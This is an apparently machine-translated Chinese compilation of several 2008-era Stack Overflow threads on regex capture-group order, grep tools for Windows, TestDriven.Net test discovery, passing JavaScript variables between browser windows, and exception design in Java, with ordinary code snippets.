a. (([0-9]{3})\.([0-9]{3})\.([0-9]{3})\.([0-9]{3}))\s+([A-Z]+)  
   (([0-9]{3})\.([0-9]{3})\.([0-9]{3})\.([0-9]{3}))  
   ([A-Z]+)  
   ([0-9]{3})  
   ([0-9]{3})  
   ([0-9]{3})  
   ([0-9]{3})  

b. (([0-9]{3})\.([0-9]{3})\.([0-9]{3})\.([0-9]{3}))\s+([A-Z]+)  
   (([0-9]{3})\.([0-9]{3})\.([0-9]{3})\.([0-9]{3}))  
   ([0-9]{3})  
   ([0-9]{3})  
   ([0-9]{3})  
   ([0-9]{3})  
   ([A-Z]+) 
```

或者

```
c. somthin' else. 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-09-17T20:35:07.843

它们往往按照捕获括号开始的顺序从左到右进行编号。因此，选项 b。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:35:24.303

在 Perl 5 正则表达式中，答案 b 是正确的。子匹配分组按开括号的顺序存储。

许多其他正则表达式引擎都从 Perl 中汲取灵感，但您必须查找各个实现才能确定。我建议您阅读[Mastering Regular Expressions](http://books.google.com/books?id=ucwR4KIvExMC&dq=mastering+regular+expressions&pg=PP1&ots=QLvzs24_Ik&sig=wUON6Y-GbGfHClq73nJNbdhQecQ&hl=en&sa=X&oi=book_result&resnum=1&ct=result)一书以加深理解。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:39:03.700

你数左括号，从左到右。所以顺序是

```
(([0-9]{3}).([0-9]{3}).([0-9]{3}).([0-9]{3}))
([0-9]{3})
([0-9]{3})
([0-9]{3})
([0-9]{3})
([A-Z]+) 
```

至少这是 Perl 会做的。其他正则表达式引擎可能有不同的规则。

# windows - 什么是适用于 Windows 的好 grep 工具？

> ID：87350
> 
> 赞同：288
> 
> 时间：2008-09-17T20:34:48.173
> 
> 标签：windows, grep

[对 Windows 的grep](http://en.wikipedia.org/wiki/Grep)工具有什么建议吗？理想情况下，可以利用 64 位操作系统。

我当然知道[Cygwin](http://www.cygwin.com/)，并且也找到了[PowerGREP](http://www.powergrep.com/)，但我想知道那里是否有任何隐藏的宝石？

* * *

## 回答 #1

> 赞同：336
> 
> 时间：2008-09-17T20:38:01.660

[FINDSTR](http://ss64.com/nt/findstr.html)相当强大，支持[正则表达式](http://en.wikipedia.org/wiki/Regular_expression)，并且已经在所有 Windows 机器上具有优势。

```
c:\> FindStr /?

Searches for strings in files.

FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file]
        [/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]
        strings [[drive:][path]filename[ ...]]

  /B         Matches pattern if at the beginning of a line.
  /E         Matches pattern if at the end of a line.
  /L         Uses search strings literally.
  /R         Uses search strings as regular expressions.
  /S         Searches for matching files in the current directory and all
             subdirectories.
  /I         Specifies that the search is not to be case-sensitive.
  /X         Prints lines that match exactly.
  /V         Prints only lines that do not contain a match.
  /N         Prints the line number before each line that matches.
  /M         Prints only the filename if a file contains a match.
  /O         Prints character offset before each matching line.
  /P         Skip files with non-printable characters.
  /OFF[LINE] Do not skip files with offline attribute set.
  /A:attr    Specifies color attribute with two hex digits. See "color /?"
  /F:file    Reads file list from the specified file(/ stands for console).
  /C:string  Uses specified string as a literal search string.
  /G:file    Gets search strings from the specified file(/ stands for console).
  /D:dir     Search a semicolon delimited list of directories
  strings    Text to be searched for.
  [drive:][path]filename
             Specifies a file or files to search.

Use spaces to separate multiple search strings unless the argument is prefixed
with /C.  For example, 'FINDSTR "hello there" x.y' searches for "hello" or
"there" in file x.y.  'FINDSTR /C:"hello there" x.y' searches for
"hello there" in file x.y.

Regular expression quick reference:
  .        Wildcard: any character
  *        Repeat: zero or more occurances of previous character or class
  ^        Line position: beginning of line
  $        Line position: end of line
  [class]  Character class: any one character in set
  [^class] Inverse class: any one character not in set
  [x-y]    Range: any characters within the specified range
  \x       Escape: literal use of metacharacter x
  \<xyz    Word position: beginning of word
  xyz\>    Word position: end of word 
```

示例用法：`findstr text_to_find *`或递归搜索`findstr /s text_to_find *`

* * *

## 回答 #2

> 赞同：214
> 
> 时间：2008-09-17T20:37:27.730

## 根据评论中的建议，我开始使用[grepWin](https://tools.stefankueng.com/grepWin.html)，它很棒而且*免费*。

* * *

（我仍然是[PowerGREP](http://www.powergrep.com/)的粉丝，但我不再使用它了。）

我知道你已经提到过，但是 PowerGREP**很棒**。

我最喜欢的一些功能是：

*   右键单击文件夹以在其上运行 PowerGREP
*   使用正则表达式或文字文本
*   为要包含和排除的文件指定通配符
*   搜索和替换
*   预览模式很好，因为您可以确保您正在替换您打算替换的内容。

现在我意识到其他 grep 工具可以完成以上所有工作。只是 PowerGREP 将所有功能打包到一个非常易于使用的 GUI 中。

***[来自为您带来RegexBuddy](http://en.wikipedia.org/wiki/RegexBuddy)的同样出色的人，而我与他们没有任何关系，只是喜欢他们的东西。***（需要注意的是，RegexBuddy 本身包含一个基本版本的 grep（适用于 Windows），它的成本比 PowerGREP 低很多。）

* * *

## 其他解决方案

### 现有的 Windows 命令

*   [查找字符串](http://ss64.com/nt/findstr.html)
*   PowerShell 中[的选择字符串](https://technet.microsoft.com/en-us/library/hh849903.aspx)

### Windows 上的 Linux 命令实现

*   [赛格温](http://en.wikipedia.org/wiki/Cygwin)
*   [现金](https://github.com/dthree/cash)

### 具有图形界面的 Grep 工具

*   [AstroGrep](http://astrogrep.sourceforge.net/screenshots/)
*   [BareGrep](https://www.baremetalsoft.com/baregrep/)
*   [格雷普温](http://stefanstools.sourceforge.net/grepWin.html)

### 其他 Grep 工具

*   [dngrep](http://code.google.com/p/dngrep/)

* * *

## 回答 #3

> 赞同：111
> 
> 时间：2010-11-29T22:11:29.187

**[GrepWin](https://tools.stefankueng.com/grepWin.html)**是免费和开源的 (GPL)

![在此处输入图像描述](https://i.stack.imgur.com/M4Ru8.png)

我一直在使用由[TortoiseSVN](https://en.wikipedia.org/wiki/TortoiseSVN)中的一个人编写的 grepWin。它在 Windows 上完成了这项工作......

* * *

## 回答 #4

> 赞同：57
> 
> 时间：2008-09-17T20:37:11.037

2013 年 7 月更新：

我现在在 Windows 上一直使用的另一个 grep 工具是[**AstroGrep**](http://astrogrep.sourceforge.net/screenshots/)：

![AstroGrep 真棒](https://i.stack.imgur.com/0BpOZ.jpg)

它向我展示的不仅仅是行搜索（即命令行 grep 的 --context=NUM）的能力是无价的。
而且速度很快。[速度非常快，即使在没有SSD](http://en.wikipedia.org/wiki/Ssd)驱动器的旧计算机上也是如此（我知道，他们曾经用*旋转*磁盘来做这个硬盘驱动器，称为[platters](http://en.wikipedia.org/wiki/Hard_disk_platter)，很疯狂吧？）

这是免费的。
它是可移植的（简单的 zip 存档解压缩）。

* * *

原始答案 2008 年 10 月

![替代文字](https://www.gnu.org/graphics/gnu-head-sm.jpg)[Gnu Grep](http://www.gnu.org/software/grep/)没问题

例如，您可以在此处下载它：（[站点 ftp](ftp://mirrors.kernel.org/gnu/grep/)）

所有[常用选项](http://www.gnu.org/software/grep/manual/grep.html#Command_002dline-Options)都在这里。

结合[gawk](http://www.gnu.org/software/gawk/)和[xargs](http://icanhaslinux.com/2007/09/10/xargs-is-your-friend/)（包括来自[GnuWin32](http://gnuwin32.sourceforge.net/)的 'find' ），你可以真正像在 Unix 上一样编写脚本！

另请参阅[我用于递归 grep 的选项](https://stackoverflow.com/a/14871646/6309)：

```
grep --include "*.xxx" -nRHI "my Text to grep" * 
```

* * *

## 回答 #5

> 赞同：31
> 
> 时间：2008-09-17T20:42:04.300

PowerShell 的[Select-String](https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Select-String) cmdlet 在 v1.0 中很好，但在[v2.0 中要好得多](http://blogs.msdn.com/powershell/archive/2007/11/06/what-s-new-in-ctp-of-powershell-2-0.aspx)。将 PowerShell 内置到最新版本的 Windows 意味着您在这里的技能将始终有用，而无需先安装一些东西。

> **添加到 Select-String 的新参数**：Select-String cmdlet 现在支持新参数，例如：
> 
> *   -Context：这允许您查看匹配行之前和之后的行
> *   -AllMatches：允许您查看一行中的所有匹配项（以前，您只能看到一行中的第一个匹配项）
> *   -NotMatch：等效于 grep -vo
> *   -Encoding：指定字符编码

我发现为 . 创建一个函数`gcir`、`Get-ChildItem -Recurse .`正确传递参数以及`ss`为`Select-String`. 所以你写：

> gcir *.txt | ss 富

* * *

## 回答 #6

> 赞同：23
> 
> 时间：2008-09-18T06:11:01.780

[它可能不完全属于“grep”类别，但如果没有名为AgentRansack](http://www.mythicsoft.com/agentransack/)的实用程序，我无法在 Windows 上使用。它是一个基于 GUI 的“在文件中查找”实用程序，支持正则表达式。

右键单击文件夹，点击“ransack..”并找到包含您要查找的文件的文件非常简单。它也非常快。

* * *

## 回答 #7

> 赞同：19
> 
> 时间：2008-09-17T20:38:25.543

[Baregrep](http://www.baremetalsoft.com/baregrep/)（[Baretail](http://www.baremetalsoft.com/baretail/)也不错）

* * *

## 回答 #8

> 赞同：17
> 
> 时间：2010-08-13T15:06:53.603

我推荐[AstroGrep](http://astrogrep.sourceforge.net)。

它是免费的、开源的，并且有一个简单的界面。我一直用它来搜索代码。

* * *

## 回答 #9

> 赞同：17
> 
> 时间：2011-03-11T22:07:59.143

PowerShell 已被多次提及。以下是您实际以 grepish 方式使用它的方式：

```
Get-ChildItem -recurse -include *.txt | Select-String -CaseSensitive "SomeString" 
```

它递归地搜索当前目录树中的所有文本文件，`SomeString`区分大小写。

**更好的是，运行这个：**

```
function pgrep { param([string]$search, [string]$inc) Get-ChildItem -recurse -include $inc | Select-String -CaseSensitive $search } 
```

然后做：

```
pgrep SomeStringToSearch *.txt 
```

然后为了真正让它变得神奇，将函数别名添加到您的[PowerShell 配置文件](http://msdn.microsoft.com/en-us/library/bb613488%28v=vs.85%29.aspx "Powershell 配置文件")中，您几乎可以减轻没有适当命令行工具的痛苦。

* * *

## 回答 #10

> 赞同：15
> 
> 时间：2012-01-16T14:22:08.680

**Windows 上的 Git = cmd.exe 中的 grep**

我刚刚发现安装[Git](http://en.wikipedia.org/wiki/Git_%28software%29)会给你一些基本的 Linux 命令：cat、grep、scp 和所有其他好的命令。

安装然后将 Git bin 文件夹添加到您的 PATH 中，然后您的 cmd.exe 具有基本的 Linux 功能！

[http://code.google.com/p/msysgit/downloads/list?can=3](http://code.google.com/p/msysgit/downloads/list?can=3)

* * *

## 回答 #11

> 赞同：14
> 
> 时间：2008-09-17T20:38:15.950

[ack](http://petdance.com/ack/)在 Windows 上运行良好（如果你有[Perl](http://en.wikipedia.org/wiki/Perl)）。我发现它在许多用途上都比 grep 好。

* * *

## 回答 #12

> 赞同：14
> 
> 时间：2008-09-17T20:40:57.503

[Cygwin](https://en.wikipedia.org/wiki/Cygwin)包括 grep。如果你安装了 Cygwin，所有 GNU 工具和 Unix 的东西都可以在 Windows 上很好地工作。

* * *

## 回答 #13

> 赞同：13
> 
> 时间：2011-05-17T18:28:34.383

[dnGREP](http://code.google.com/p/dngrep/)是一个开源的 Windows grep 工具。它支持许多很酷的功能，包括：

*   撤消替换
*   能够通过右键单击资源管理器中的文件夹进行搜索
*   高级搜索选项，例如拼音搜索和 xpath
*   在 PDF 文件、档案和 Word 文档中搜索

恕我直言，它也有一个漂亮而干净的界面:)

* * *

## 回答 #14

> 赞同：7
> 
> 时间：2008-09-17T20:36:35.920

我总是使用[WinGREP](http://www.wingrep.com)，但我遇到了不放手文件的问题。

* * *

## 回答 #15

> 赞同：7
> 
> 时间：2008-09-17T21:17:26.680

好吧，除了[GNU grep 的 Windows 端口](http://gnuwin32.sourceforge.net/)之外，免费软件 Borland 的 Free C++ Compiler（它是一个带有命令行工具的免费软件）中还提供了 Borland 的 grep（与 GNU 非常相似）。

* * *

## 回答 #16

> 赞同：7
> 
> 时间：2008-09-18T06:37:26.977

我已经成功地将[GNU 实用程序用于 Win32](http://unxutils.sourceforge.net/)有一段时间了，它有一个很好的 grep 以及[tail](https://en.wikipedia.org/wiki/Tail_(Unix))和其他方便的 Win32 GNU 实用程序。我避免使用打包的 shell，直接在 Win32 命令提示符下使用可执行文件。

打包的*tail*也是一个不错的小应用。

* * *

## 回答 #17

> 赞同：6
> 
> 时间：2011-12-12T03:32:12.153

我是[Aba Search and Replace 的作者。](http://www.abareplace.com)就像 PowerGREP 一样，它支持正则表达式、保存模式以供进一步使用、撤消替换、预览 HTML/CSS/JS/PHP 的语法突出显示、不同的编码，包括 UTF-8 和 UTF-16。

与 PowerGREP 相比，GUI**不那么杂乱。**当您输入模式时，Aba 会立即开始搜索**（增量搜索），**因此您可以尝试使用正则表达式并立即查看结果。

欢迎您试用我的工具；我很乐意回答任何问题。

* * *

## 回答 #18

> 赞同：4
> 
> 时间：2011-06-24T09:47:34.933

我想要一个适用于 Windows 的免费 grep 工具，它允许您右键单击文件夹并对每个文件进行正则表达式搜索 - 没有任何唠叨屏幕。

以下是基于上`findstr`一篇文章中提到的快速解决方案。

在硬盘驱动器上的某个位置创建一个文本文件，用于保存长期使用的工具。重命名为 .bat 或 .cmd 并将以下内容粘贴到其中：

```
@echo off
set /p term="Search term> "
del %temp%\grepresult.txt
findstr /i /S /R /n /C:"%term%" "%~1\*.*" > "%temp%\grepresult.txt"
start notepad "%temp%\grepresult.txt" 
```

然后浏览到 SendTo 文件夹。在 Windows 7 上，浏览到`%APPDATA%\Microsoft\Windows\SendTo`批处理文件的快捷方式并将其拖动到该 SendTo 文件夹。

我重命名了快捷方式，`1 GREP`使其保持在 SendTo 列表的顶部。

接下来我想做的事情是将输出`findstr`通过管道输出，这些东西会生成一个 html 文件，以便您可以单击每个输出行来打开该文件。另外，我认为它不适用于文件夹的快捷方式。我必须检查参数，看看它是否包含“.lnk”。

* * *

## 回答 #19

> 赞同：3
> 
> 时间：2008-09-18T06:00:17.423

[UnxUtils](http://unxutils.sourceforge.net/)是我使用的那个，它非常适合我......

* * *

## 回答 #20

> 赞同：3
> 
> 时间：2011-03-02T17:50:48.820

我使用 Borland 的 grep 多年，但我只是发现了一个不匹配的模式。埃克斯。这些年来它还没有发现什么？[我写了一个简单的文本搜索替换，它像 grep 一样进行递归 - 它是SourceForge 上](https://en.wikipedia.org/wiki/SourceForge)的 FS.EXE 。

grep 失败...

```
C:\DEV> GREP GAAPRNTR \SOURCE\TPALIB\*.PRG
<no results> 
```

Windows 的[findstr](https://ss64.com/nt/findstr.html)工作...

```
C:\DEV> FINDSTR GAAPRNTR \SOURCE\TPALIB\*.PRG
\SOURCE\TPALIB\TPGAAUPD.PRG:ffSPOOL(cRPTFILE, MEM->GAAPRNTR, MEM->NETTYPE)
\SOURCE\TPALIB\TPPRINTR.PRG:    AADD(mPRINTER,   TPACONFG->GAAPRNTR)
\SOURCE\TPALIB\TPPRINTR.PRG:               IF TRIM(TPACONFG->GAAPRNTR) <> TRIM(mPRINTER[2])
\SOURCE\TPALIB\TPPRINTR.PRG:                   REPLACE TPACONFG->GAAPRNTR WITH mPRINTER[2] 
```

* * *

## 回答 #21

> 赞同：3
> 
> 时间：2011-10-10T15:25:59.597

我选择的工具是适当命名的 Windows Grep：

*   漂亮的简单图形用户界面
*   支持搜索和替换
*   可以显示找到的线条周围的线条
*   可以在 CSV 和固定宽度文件的列中搜索

* * *

## 回答 #22

> 赞同：2
> 
> 时间：2008-09-17T20:36:00.557

PowerShell 的[Select-String](https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Select-String)类似。它没有相同的选项和语义，但它仍然很强大。

* * *

## 回答 #23

> 赞同：2
> 
> 时间：2011-09-08T05:42:12.070

另一个不错的选择是[MSYS](http://www.mingw.org/wiki/MSYS)。它为您提供了许多其他 GNU 实用程序，让您更有效率。

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2011-09-07T00:16:33.313

如果您想要一个简单易用的 Windows Grep 工具，我创建了一个名为 P-Grep 的工具，可以从我的网站免费下载：[www.adjutantit.com](http://www.adjutantit.com) - 主菜单，下载。

Windows Grep 似乎有大量文件的问题，所以我自己写了 - 这似乎更可靠。您可以选择一个文件夹，右键单击并将其发送到 P-Grep。sendto 文件夹在安装过程中得到更新。

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2011-12-21T11:57:28.667

多年来，我每天都在使用[AJC Grep 。](http://www.ajcsoft.com/grep-search.htm)我发现的唯一主要限制是文件路径限制为 255 个字符，并且在遇到一个字符时会停止，而不仅仅是发出警告。这很烦人，但并不经常发生。

我在 64 位 Windows 7 Ultimate 上使用它，所以它的 64 位凭据很好。

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2012-01-05T23:02:02.673

[用于 Windows 的 GREP](http://www.interlog.com/~tcharron/grep.html)

我一直在使用它，幸运的是它仍然可用。它超级快而且非常小。

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2011-09-13T21:45:51.390

我在我的机器上安装了[Cygwin](http://en.wikipedia.org/wiki/Cygwin)并将 Cygwin bin 目录放在我的环境路径中，因此 Cygwin grep 在命令行中正常工作，这解决了我目前对 grep 的所有脚本需求。

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2012-02-20T16:55:32.443

如果没有一个解决方案是您正在寻找的，也许您可[​​以为 FindStr](https://ss64.com/nt/findstr.html)编写一个包装器来满足您的需求？

FindStr 无论如何都很好，所以它应该只是打开一个 GUI（如果你想要的话）并提供一些额外的功能（比如将它与 Find 结合起来以查找包含指定字符串的文件的数量 [上面提到的]）。

当然，这假设您有这样做的要求、时间和意愿！

# .net - TestDriven.Net 找不到测试

> ID：87355
> 
> 赞同：3
> 
> 时间：2008-09-17T20:35:12.120
> 
> 标签：.net, unit-testing, testing, mbunit, testdriven.net

我有一个使用 MbUnit 和 TestDriven.Net 的测试项目。

如果我右键单击单个测试方法并说“运行测试”，则测试成功运行。如果我在解决方案资源管理器中单击文件名，也会发生同样的事情。

但是，如果我右键单击并说在项目或解决方案上运行测试，TestDriven.Net 会报告“0 Passed, 0 Failed, 0 Skipped”。

我还有其他类似的项目可以正常工作，是的，这些类被标记为 [TestFixture]，方法被标记为 [Test]。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-09-18T10:42:14.377

课程是公开的吗？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-09-18T10:42:50.800

我曾经有过类似的问题。问题是我忘记用*public*修饰符声明我的测试类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:55:05.520

您需要为您最喜欢的测试框架添加测试属性。TestDriven 通过反射获取这些属性，以便知道要运行哪些测试。

例如，使用 NUnit.Framework - 每个测试类都需要 [TextFixture] 并且每个测试方法都需要 [Test]

这是一个[例子](http://www.nunit.org/index.php?p=test&r=2.2)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-18T11:00:07.860

如果您使用的是 Windows x64，则可能是[安装程序问题](http://blog.davebouwman.net/CommentView,guid,ccc158a2-d4fd-4765-9251-92be838f1ed8.aspx)。它在 Server 20080 x64 上咬了我一口。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-06T23:27:23.657

只需确保在 Gallio 之前安装了 TestDriven.Net，否则 Gallio 不会为 TestDriven.Net 安装其扩展。

Gallio v3.0.4 和更新版本包括一个 64 位安装程序。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-07-03T08:18:40.497

如果我使用最新版本的 NUnit，我已经看到 TestDriven.Net 没有找到任何测试，重新安装 TestDriven.Net 解决了这个问题。

# javascript - 我可以将 JavaScript 变量传递到另一个浏览器窗口吗？

> ID：87359
> 
> 赞同：75
> 
> 时间：2008-09-17T20:35:28.763
> 
> 标签：javascript, browser

我有一个页面会产生一个弹出式浏览器窗口。我在父浏览器窗口中有一个 JavaScript 变量，我想将它传递给弹出的浏览器窗口。

有没有办法做到这一点？我知道这可以在同一个浏览器窗口中跨框架完成，但我不确定是否可以跨浏览器窗口完成。

* * *

## 回答 #1

> 赞同：113
> 
> 时间：2008-09-17T21:14:36.203

将代码放在这件事上，您可以从父窗口执行此操作：

```
var thisIsAnObject = {foo:'bar'};
var w = window.open("http://example.com");
w.myVariable = thisIsAnObject; 
```

或者从新窗口中：

```
var myVariable = window.opener.thisIsAnObject; 
```

我更喜欢后者，因为您可能需要等待新页面加载，以便您可以访问其元素或任何您想要的。

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2008-09-17T20:38:25.620

如果这些窗口来自同一个安全域，并且您有对另一个窗口的引用，是的。

Javascript 的 open() 方法返回对创建的窗口（或现有窗口，如果它重用现有窗口）的引用。以这种方式创建的每个窗口都会应用一个属性“window.opener”，指向创建它的窗口。

然后可以使用 DOM（取决于安全性）来访问另一个的属性，或者它的文档、框架等。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-09-17T21:17:57.320

是的，脚本可以访问它们拥有句柄的同一域中其他窗口的属性（通常通过 window.open/opener 和 window.frames/parent 获得）。调用在另一个窗口上定义的函数通常更易于管理，而不是直接摆弄变量。

但是，窗口可能会死掉或继续移动，并且浏览器会以不同的方式处理它。检查窗口 (a) 是否仍然打开 (!window.closed) 并且 (b) 具有您期望的可用功能，然后再尝试调用它。

字符串之类的简单值很好，但通常在窗口之间传递复杂的对象（例如函数、DOM 元素和闭包）并不是一个好主意。如果子窗口从其打开器存储一个对象，然后打开器关闭，则该对象可能会“死”（在某些浏览器中，例如 IE），或导致内存泄漏。可能会出现奇怪的错误。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-05-23T16:40:52.217

在窗口之间传递变量（如果您的窗口在同一个域上）可以通过以下方式轻松完成：

1.  饼干
2.  本地存储。只需确保您的浏览器支持 localStorage，并正确进行变量维护（添加/删除/删除）以保持 localStorage 干净。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2017-01-17T21:30:45.347

可以将消息从“父”窗口传递到“子”窗口：

在“父窗口”中打开孩子

```
 var win = window.open(<window.location.href>, '_blank');    
       setTimeout(function(){
                    win.postMessage(SRFBfromEBNF,"*")
                  },1000);
    win.focus(); 
```

根据上下文替换的

在“孩子”

```
 window.addEventListener('message', function(event) {
        if(event.srcElement.location.href==window.location.href){
        /* do what you want with event.data */
        }
    }); 
```

if 测试必须根据上下文进行更改

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2008-09-17T21:05:42.187

在您的父窗口中：

```
var yourValue = 'something';
window.open('/childwindow.html?yourKey=' + yourValue); 
```

然后在 childwindow.html 中：

```
var query = location.search.substring(1);
var parameters = {};
var keyValues = query.split(/&/);
for (var keyValue in keyValues) {
    var keyValuePairs = keyValue.split(/=/);
    var key = keyValuePairs[0];
    var value = keyValuePairs[1];
    parameters[key] = value;
}

alert(parameters['yourKey']); 
```

在解析键/值对时可能会进行大量错误检查，但我不包括在此处。也许有人可以在以后的答案中提供更具包容性的 Javascript 查询字符串解析例程。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-01-31T15:34:24.593

您可以很容易地传递变量并引用父窗口中的内容：

```
// open an empty sample window:
var win = open("");
win.document.write("<html><body><head></head><input value='Trigger handler in other window!' type='button' id='button'></input></body></html>");

// attach to button in target window, and use a handler in this one:
var button = win.document.getElementById('button');

button.onclick = function() {
     alert("I'm in the first frame!");   
} 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-09-17T20:39:26.320

是的，只要两个窗口都在同一个域上，就可以做到。window.open() 函数将返回新窗口的句柄。子窗口可以使用 DOM 元素“opener”访问父窗口。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2019-11-18T10:49:34.610

对我来说，以下不起作用

```
var A = {foo:'bar'};
var w = window.open("http://example.com");
w.B = A;

// in new window
var B = window.opener.B; 
```

但这有效（注意变量名）

```
var B = {foo:'bar'};
var w = window.open("http://example.com");
w.B = B;

// in new window
var B = window.opener.B; 
```

var B 也应该是全局的。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-09-17T21:04:22.297

或者，您可以将其添加到 URL 并让脚本语言（PHP、Perl、ASP、Python、Ruby 等）在另一端处理它。就像是：

```
var x = 10;
window.open('mypage.php?x='+x); 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2015-11-24T13:49:05.910

我一直在努力成功地将参数传递给新打开的窗口。
这是我想出的：

```
function openWindow(path, callback /* , arg1 , arg2, ... */){
    var args = Array.prototype.slice.call(arguments, 2); // retrieve the arguments
    var w = window.open(path); // open the new window
    w.addEventListener('load', afterLoadWindow.bind(w, args), false); // listen to the new window's load event
    function afterLoadWindow(/* [arg1,arg2,...], loadEvent */){
        callback.apply(this, arguments[0]); // execute the callbacks, passing the initial arguments (arguments[1] contains the load event)
    }
} 
```

**示例调用：**

```
openWindow("/contact",function(firstname, lastname){
    this.alert("Hello "+firstname+" "+lastname);
}, "John", "Doe"); 
```

**活生生的例子**

[http://jsfiddle.net/rj6o0jzw/1/](http://jsfiddle.net/rj6o0jzw/1/)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2016-05-11T17:48:48.923

您可以`window.name`用作窗口之间的数据传输 - 它也可以跨域工作。没有官方支持，但据我了解，实际上跨浏览器效果很好。

[有关此 Stackoverflow 帖子的更多信息](https://stackoverflow.com/q/10567847/26510)

* * *

## 回答 #13

> 赞同：-1
> 
> 时间：2011-10-08T09:50:00.220

是的浏览器清除所有参考。一个窗口。因此，您必须在主窗口中搜索某个类名或使用 cookie 作为 Javascript 自制参考。

我的项目页面上有一台收音机。然后你打开收音机，它在一个弹出窗口中启动，我控制主页上的主窗口链接并显示播放状态，在 FF 中它很容易，但在 MSIE 中根本不那么容易。但这是可以完成的。

* * *

## 回答 #14

> 赞同：-2
> 
> 时间：2008-09-17T20:37:32.177

如果您对创建的窗口有引用，window.open() 函数也将允许这样做，前提是它位于同一域中。如果该变量用于服务器端，您应该使用 $_SESSION 变量（假设您使用的是 PHP）。

# java - 应该如何在架构级别计划异常？

> ID：87362
> 
> 赞同：9
> 
> 时间：2008-09-17T20:35:40.137
> 
> 标签：java, exception, architecture

是否有任何好的资源可以从架构的角度规划如何使用异常？（或者直接在这里提供你的建议。）在我工作过的项目中，我发现一些常见的异常被一遍又一遍地使用，并且往往失去了它们的意义。来自：http: [//jamesjava.blogspot.com/2007/10/exception-plan.html](http://jamesjava.blogspot.com/2007/10/exception-plan.html)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T21:21:01.370

我通常发现沉迷于检查的异常是矫枉过正的。应为程序无法合理恢复的意外错误情况保留异常。对于这些，我倾向于同意您观察到的内容，即特殊错误类型往往会失去意义。

作为一般规则，当满足以下所有条件时抛出异常：

*   无法从这里恢复状态。
*   不能合理地期望调用者从这种情况中恢复。
*   有人会想调试这种情况，所以他们可能想查看堆栈跟踪。

你会发现，如果这些都是真的，那么异常的类型并不重要，你还不如抛出 java.lang.Error。如果其中任何一个是错误的，那么异常可能是矫枉过正（你真的需要类型、消息和堆栈跟踪吗？）

相反，请考虑增加方法的返回类型以指示预期的失败类型。例如，对于在某些情况下不返回值可能有意义的方法，使用[Option<A>类型。](http://functionaljava.googlecode.com/svn/artifacts/2.17/javadoc/fj/data/Option.html)对于可能需要返回其类型取决于失败或成功的值的方法，请使用[Either<A,B>类型。](http://functionaljava.googlecode.com/svn/artifacts/2.17/javadoc/fj/data/Either.html)在您之前可能有专门的 Exception 子类型的地方，您可以改为使用 Either<Fail,A> ，其中 Fail 只是对预期失败类型的枚举。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-23T20:15:08.707

我一半同意 Apocalisp 的评论。应为发生数据或处理错误但可以通过用户或系统干预恢复的情况保留异常实例。RuntimeException 的实例应该保留给那些在您的应用程序范围内没有干预可以解决问题的情况。因此，这两种类型被称为 Checked 和 Unchecked 异常。

未检查异常的一个示例是物理资源（例如数据库或消息总线）不可用。在这种情况下，RuntimeException 很好，因为您不打算让资源不可用，因此您的业务逻辑不必经常检查 DatabaseUnavailableException 或类似的东西。您可以以不同的方式处理 RuntimeExceptions（可能是 AOP 发送电子邮件）以报告中断并让员工或支持人员解决物理问题。

Checked 异常的示例包括数据输入不佳、数据访问不完整或业务逻辑实际上失败但可以检查和恢复的情况。例如，您搜索的用户不可用。这是您的业务逻辑中的一个单独条件，可以检查和处理（例如由应用程序的 View 部分，然后将异常消息作为错误消息报告给用户）。

许多框架都使用这个模型，而且它似乎比我以前看到的效果更好。

话虽如此，许多确实将检查的异常替换为返回的空值、-1、空字符串或 Number.MIN_VALUE。虽然这没关系，但如果您通常不期望数据源或方法中的这些值，它可能应该表示为异常。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:37:40.583

[“有效的 Java”，第 2 期。编。Bloch](http://java.sun.com/docs/books/effective)在第 9 章中有一些很好的建议。

[“Hardcore Java”，Simmons](http://oreilly.com/catalog/9780596005689)在第 5 章中有一些很好的建议。

我还要无耻地提到我写[了一个小工具](http://code.google.com/p/excepgen/)来管理Java异常源代码。异常代码通常非常多余，您通常关心的只是类型。我的工具接受一个命名异常类型的配置文件，然后为这些异常生成代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:45:34.887

我尝试确保使用 try/finally 的位置数量大大超过使用 try/catch 的位置数量。catch 通常被保留用于在顶层捕获异常——它们可以被合理地处理，或者处理来自平台 API 的异常。

在这种情况下，只要您给异常提供有意义的消息，并在必要时链接异常，无法通过其类来识别异常并不是什么大损失。我经常抛出 RuntimeException 而不是尝试为每个可能的错误情况开发一个异常类 - 但您对此的看法将取决于您在已检查与未检查异常辩论中所处的位置。

# security - 网站可以捕获哪些识别信息？

> ID：87365
> 
> 赞同：18
> 
> 时间：2008-09-17T20:35:59.823
> 
> 标签：security, browser

